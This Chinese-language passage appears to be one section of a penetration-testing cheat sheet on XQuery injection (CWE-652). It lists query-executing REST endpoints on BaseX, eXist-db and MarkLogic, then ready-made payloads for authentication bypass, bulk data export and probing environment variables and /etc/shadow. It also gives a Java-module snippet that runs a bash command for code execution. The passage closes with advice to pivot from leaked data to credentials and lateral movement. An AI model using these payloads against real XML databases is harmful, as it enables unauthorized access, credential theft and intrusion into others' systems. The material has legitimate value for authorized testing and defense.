## 七、XQuery表达式注入面（CWE-652）

### 7.1 XQuery与XPath关系
XQuery是XPath的超集：XPath表达式本身即合法XQuery，另加FLWOR循环、类型转换、函数库、外部变量。凡用XQuery处理XML数据库的应用（`for $x in ... return ...`模式）都存在注入面，编码CWE-652（父类CWE-91，子类CWE-943）。已知CVE：CVE-2023-28676（CVSS 8.8）、CVE-2023-25015。

### 7.2 XML数据库攻击面（BaseX/eXist/MarkLogic）
```
# BaseX REST服务（默认http://localhost:8080/rest/）
GET  /rest?query=count(.)                      # 直接执行XQuery
GET  /rest?command=show+users                  # 执行数据库命令（用户枚举）
GET  /rest?run=eval.xq                         # 执行服务器端XQuery文件
POST /rest  body=<query>...</query>            # POST执行

# eXist-db REST（/exist/rest/db/...）+ XQuery执行
# MarkLogic /v1/eval 接口直接POST XQuery
```

### 7.3 XQuery注入Payload
```
# 基础探测
' or '1'='1
') or ('1'='1

# FLWOR批量导出（经典）
' or 1=1 return $x || ''
for $x in doc("users.xml")//user return $x

# 认证绕过
for $u in //user[username='' or '1'='1' and password='x'] return $u

# 变量/环境信息（可利用实现扩展函数）
' or (fn:environment-variable('PATH')) or '        # 环境变量
' or (fn:doc-available('file:///etc/shadow')) or ' # 文件存在探测
' or (basex:system() ) or '                        # BaseX系统信息（实现特定）
```

### 7.4 XQuery → RCE（实现特定）
```
# BaseX: 无默认命令执行扩展；但支持Java集成（modules）
import module namespace os = "java:java.lang.ProcessBuilder";
os:start(os:new(("bash", "-c", "id")))

# eXist: 通过EXPath包管理/内部模块，或结合存储过程
# MarkLogic: 禁用的外部库（xdmp:spawn）等
```
**要点**：XQuery RCE高度依赖实现与配置，优先走"数据泄露→凭据→横向"而非强行RCE；XML数据库常与SSO/LDAP集成，泄出的凭据价值极高。

